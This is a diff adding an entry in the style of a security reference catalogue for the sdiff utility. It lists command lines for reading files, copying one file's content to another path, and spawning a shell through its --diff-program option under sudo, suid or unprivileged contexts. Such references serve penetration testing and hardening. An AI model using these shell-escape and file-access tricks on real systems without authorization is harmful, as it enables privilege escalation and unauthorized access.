@@ -1,0 +1,33 @@
+---
+functions:
+  file-read:
+  - binary: false
+    code: |-
+      sdiff /path/to/input-file /path/to/input-file
+    comment: |-
+      Shows the output as a diff view.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - binary: false
+    code: |-
+      sdiff /path/to/input-file  $(mktemp) -o /path/to/output-file
+    comment: |-
+      When executing the command, an editor opens. By entering "l",
+      the entire file content of input-file is copied into output-file .
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      TMPFILE=$(mktemp)
+      echo "/bin/sh" > $TMPFILE
+      chmod +x $TMPFILE
+      sdiff --diff-program $TMPFILE $(mktemp) $(mktemp)
+    contexts:
+      sudo:
+      unprivileged:
+...
